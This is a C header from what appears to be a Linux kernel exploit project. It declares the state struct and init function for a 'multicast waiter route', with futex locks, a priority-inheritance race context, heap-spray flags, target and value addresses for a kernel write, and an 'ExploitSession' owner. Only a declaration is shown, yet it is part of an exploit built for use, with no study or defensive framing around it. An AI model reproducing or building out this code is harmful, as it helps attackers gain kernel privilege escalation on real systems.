#ifndef MULTICAST_WAITER_ROUTE_H
#define MULTICAST_WAITER_ROUTE_H

#include "memory/payload_builder.h"
#include "pi_race.h"
#include "profile.h"
#include "routes/route_status.h"

#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>

/* Resident multicast waiter lifecycle (CPP13 step A).
 *
 * The context owns the resident socket and the two worker pthreads; every
 * field starts zeroed by multicast_waiter_route_context_init() and the status
 * starts as ROUTE_RETRYABLE. The validated order is fixed:
 *   disarm  -> stop_requested, drop consumer_go, wait for consumer_inflight,
 *              then mark kernel_disarmed;
 *   destroy -> join waiter, join owner, close the socket, mark userspace_clean
 *              and downgrade a non-OK armed route to ROUTE_FALLBACK_SAFE.
 * The one-shot route keeps its own small stack frame in
 * do_kernel5_fake_lock_route() and shares only the pure payload encoding.
 * The process-level resident is reached through resident_context() in
 * route_operations.cpp; SESSION-04 moves that owner into ExploitSession. */
typedef struct MulticastWaiterRouteContext {
    PiRaceContext *race;
    const WriteRequest *request;
    const struct execution_settings *execution;
    MulticastWaiterLayout layout;
    uint32_t lock1_futex, lock2_futex, condition_futex;
    pthread_t owner_worker, waiter_worker;
    int owner_worker_started, waiter_worker_started;
    atomic_int waiter_has_lock2, owner_has_lock1;
    atomic_int waiter_waiting, owner_waiting, waiter_ready;
    atomic_int respray_requested, sprayed, stop_requested;
    atomic_int owner_done, waiter_tid;
    uintptr_t target, value, lock, task;
    int socket_fd;
    int ready, scheduler_policy, lock_slot;
    int main_cpu, consumer_cpu;
    int resident;
    RouteStatus status;
} MulticastWaiterRouteContext;

void multicast_waiter_route_context_init(
        MulticastWaiterRouteContext *context,
        PiRaceContext *race,
        const WriteRequest *request,
        const struct execution_settings *execution,
        MulticastWaiterLayout layout,
        int resident);

#endif
